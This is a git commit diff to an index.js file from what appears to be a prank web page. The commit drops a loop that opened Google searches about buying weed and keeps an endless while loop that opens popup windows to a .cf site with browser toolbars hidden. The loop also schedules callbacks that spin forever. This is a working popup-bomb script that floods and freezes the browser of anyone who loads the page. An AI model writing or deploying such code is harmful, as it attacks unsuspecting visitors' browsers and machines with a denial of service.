95cb5c3483636d8615fd719d8f21597057feb83f
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 20:12:13 -0500

    Update index.js

--- index.js
+++ index.js
@@ -5,11 +5,8 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     alert("Thicc Katz")
   }
 } else {
-  for (var i = 0; i < 4; i++) {
-    window.open(('https://www.google.com/search?q=how+to+buy+weed+in+connecticut&oq=how+to+buy+weed+in+connecticut&aqs=chrome..69i57j0l5.7351j0j7&sourceid=chrome&ie=UTF-8', '_blank', 'toolbar=0,location=0,menubar=0'););
-  }
   while (true) {
-    window.open('http://kplibrary.cf/', '_blank', 'toolbar=0,location=0,menubar=0');
+    window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
     setTimeout(function() {
       for (var i = 0; i === i; i++) {}
     }, 50);
